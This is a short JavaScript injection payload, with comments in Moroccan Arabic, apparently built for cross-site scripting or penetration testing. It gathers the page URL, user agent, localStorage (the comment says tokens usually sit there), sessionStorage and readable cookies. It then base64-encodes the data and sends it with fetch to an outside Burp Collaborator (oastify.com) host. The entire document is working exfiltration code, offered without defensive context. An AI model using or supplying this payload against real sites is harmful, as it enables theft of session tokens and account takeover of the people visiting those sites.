(async function() {
    let data = {
        url: window.location.href,
        userAgent: navigator.userAgent,
        localStorage: JSON.stringify(localStorage), // هادي غالبا فيها الـ Tokens
        sessionStorage: JSON.stringify(sessionStorage),
        cookie: document.cookie // غايجيب غير اللي ماشي HttpOnly
    };

    // إرسال الداتا كاملة مشفرة لـ Collaborator
    fetch("https://xkl1b140nnu9uk97edzp50kh58bzzrng.oastify.com/?leak=" + btoa(unescape(encodeURIComponent(JSON.stringify(data)))));
})();
